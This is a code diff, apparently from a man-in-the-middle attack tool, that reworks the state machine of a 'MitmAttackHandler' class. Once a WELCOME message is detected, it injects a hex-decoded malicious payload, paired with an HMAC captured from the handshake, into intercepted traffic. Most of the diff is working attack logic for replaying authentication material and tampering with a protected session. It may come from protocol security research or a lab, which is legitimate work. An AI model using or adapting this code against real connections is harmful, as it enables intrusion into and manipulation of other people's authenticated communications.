@@ -239,11 +239,11 @@ class MitmAttackHandler:
             else:
                 # Not a challenge, continue waiting
                 return False
-            
-        # After handshake, inject malicious payload with captured HMAC
-        elif (self.direction_name == 'alice_to_bob' and
-              self.global_state.state['active'] and 
-              self.global_state.state['phase'] == 'waiting_welcome'):
+                
+        # Detect WELCOME message to transition to payload injection phase
+        elif (self.global_state.state['active'] and 
+              self.global_state.state['phase'] == 'waiting_welcome' and
+              isinstance(raw_msg, (bytes, str))):
             welcome_detected = False
             if isinstance(raw_msg, str) and raw_msg.startswith('#WELCOME#'):
                 welcome_detected = True
@@ -254,34 +254,43 @@ class MitmAttackHandler:
                     welcome_detected = True
                     
             if welcome_detected:
-                if not self.global_state.state['injected'] and self.global_state.state['stored_hmac']:
-                    if self.attack_log:
-                        logging.info(f"[MITM] *** Injecting malicious payload with captured HMAC after successful authentication ***")
-                    
-                    # Get the correct malicious payload for this direction
-                    malicious_payload_hex = self.get_attack_payload_for_direction(source_ip, target_ip) if source_ip and target_ip else self.attack_payload_hex
-                    
-                    # Craft the malicious package: malicious payload + captured HMAC
-                    malicious_package = b''
-                    if malicious_payload_hex:
-                        try:
-                            hex_str = malicious_payload_hex.strip()
-                            if len(hex_str) % 2 != 0:
-                                hex_str = hex_str + '0'
-                            malicious_payload = binascii.unhexlify(hex_str)
-                            malicious_package = malicious_payload + self.global_state.state['stored_hmac']
-                        except Exception as e:
-                            logging.error(f"[MITM] Error crafting malicious package: {e}")
-                            malicious_package = self.global_state.state['stored_hmac']
-                    else:
+                if self.attack_log:
+                    logging.info(f"[MITM] *** WELCOME detected, transitioning to payload injection phase ***")
+                # Transition to payload injection phase
+                self.global_state.state['phase'] = 'ready_for_injection'
+                return True  # Forward the WELCOME message
+            
+        # After handshake, inject malicious payload with captured HMAC
+        elif (self.global_state.state['active'] and 
+              self.global_state.state['phase'] == 'ready_for_injection'):
+            if not self.global_state.state['injected'] and self.global_state.state['stored_hmac']:
+                if self.attack_log:
+                    logging.info(f"[MITM] *** Injecting malicious payload with captured HMAC after successful authentication ***")
+                
+                # Get the correct malicious payload for this direction
+                malicious_payload_hex = self.get_attack_payload_for_direction(source_ip, target_ip) if source_ip and target_ip else self.attack_payload_hex
+                
+                # Craft the malicious package: malicious payload + captured HMAC
+                malicious_package = b''
+                if malicious_payload_hex:
+                    try:
+                        hex_str = malicious_payload_hex.strip()
+                        if len(hex_str) % 2 != 0:
+                            hex_str = hex_str + '0'
+                        malicious_payload = binascii.unhexlify(hex_str)
+                        malicious_package = malicious_payload + self.global_state.state['stored_hmac']
+                    except Exception as e:
+                        logging.error(f"[MITM] Error crafting malicious package: {e}")
                         malicious_package = self.global_state.state['stored_hmac']
-                    
-                    writer.write(malicious_package)
-                    await writer.drain()
-                    if self.attack_log:
-                        logging.info(f"[MITM] Injected malicious package with captured HMAC after successful authentication.")
-                    self.global_state.state['injected'] = True
-                return True
+                else:
+                    malicious_package = self.global_state.state['stored_hmac']
+                
+                writer.write(malicious_package)
+                await writer.drain()
+                if self.attack_log:
+                    logging.info(f"[MITM] Injected malicious package with captured HMAC after successful authentication.")
+                self.global_state.state['injected'] = True
+            return True
             
         # If we're in attack mode but haven't seen a challenge yet, just forward normally
         elif self.global_state.state['active'] and self.global_state.state['phase'] is None:
